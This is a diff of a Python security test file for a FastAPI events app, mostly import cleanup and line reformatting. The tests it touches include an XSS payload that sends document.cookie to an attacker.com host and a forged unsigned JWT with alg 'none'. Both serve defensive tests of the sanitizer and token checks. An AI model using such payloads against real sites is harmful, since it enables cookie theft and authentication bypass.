@@ -17,21 +17,21 @@ from __future__ import annotations
 
 import logging
 from decimal import Decimal
-from unittest.mock import MagicMock
 from uuid import uuid4
 
 import pyotp
 import pytest
 from fastapi import HTTPException
-from jose import JWTError, jwt
+from jose import JWTError
 from sqlalchemy import select
 from sqlalchemy.ext.asyncio import AsyncSession
 
 from app.config import Settings
 from app.events.service import EventService
-from app.shared.contracts import CreateEventRequest, EventStatus, EventType
+from app.shared.contracts import EventStatus, EventType
 from app.shared.logging import SensitiveDataRedactor
-from app.shared.models import Event as EventModel, User as UserModel
+from app.shared.models import Event as EventModel
+from app.shared.models import User as UserModel
 from app.shared.sanitizer import sanitize_text
 from app.users.utils import (
     create_access_token,
@@ -39,7 +39,6 @@ from app.users.utils import (
     hash_password,
     verify_password,
 )
-
 
 # ==============================================================================
 # 1. SQL Injection Prevention Tests
@@ -72,7 +71,7 @@ def test_xss_sanitization_strips_script_tags() -> None:
 
 def test_xss_sanitization_strips_event_handlers() -> None:
     """XSS inline event handlers and malicious img/svg tags are neutralized."""
-    payload = '<img src=x onerror="fetch(\'http://attacker.com?c=\'+document.cookie)">Wedding Gala'
+    payload = "<img src=x onerror=\"fetch('http://attacker.com?c='+document.cookie)\">Wedding Gala"
     cleaned = sanitize_text(payload)
     assert cleaned == "Wedding Gala"
     assert "onerror" not in (cleaned or "")
@@ -128,8 +127,14 @@ def test_jwt_rejects_none_algorithm() -> None:
     import base64
 
     # Hand-craft an unsigned JWT with alg: "none"
-    header_b64 = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
-    payload_b64 = base64.urlsafe_b64encode(b'{"sub":"test-user","exp":9999999999}').rstrip(b"=").decode()
+    header_b64 = (
+        base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
+    )
+    payload_b64 = (
+        base64.urlsafe_b64encode(b'{"sub":"test-user","exp":9999999999}')
+        .rstrip(b"=")
+        .decode()
+    )
     forged_token = f"{header_b64}.{payload_b64}."
 
     with pytest.raises(JWTError):
